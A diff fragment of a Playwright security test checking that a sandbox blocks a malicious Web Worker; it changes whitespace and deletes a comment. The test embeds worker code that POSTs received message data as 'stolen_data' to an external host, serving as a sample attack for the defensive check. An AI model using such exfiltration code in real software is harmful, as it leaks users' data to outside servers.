@@ -1,7 +1,7 @@
 import { test, expect } from '@playwright/test';
 
 test.describe('// ZK_SANDBOX_SECURITY_AUDIT', () => {
-  
+
   test('> MUST_BLOCK_MALICIOUS_WORKER_EXFILTRATION', async ({ page }) => {
     let hackerEndpointHit = false;
     let cspViolationTriggered = false;
@@ -24,7 +24,6 @@ test.describe('// ZK_SANDBOX_SECURITY_AUDIT', () => {
       const maliciousWorkerCode = `
         self.onmessage = async function(e) {
             try {
-                // Attempting to steal data to an external server
                 await fetch("https://jsonplaceholder.typicode.com/posts", {
                     method: "POST",
                     body: JSON.stringify({ stolen_data: e.data })
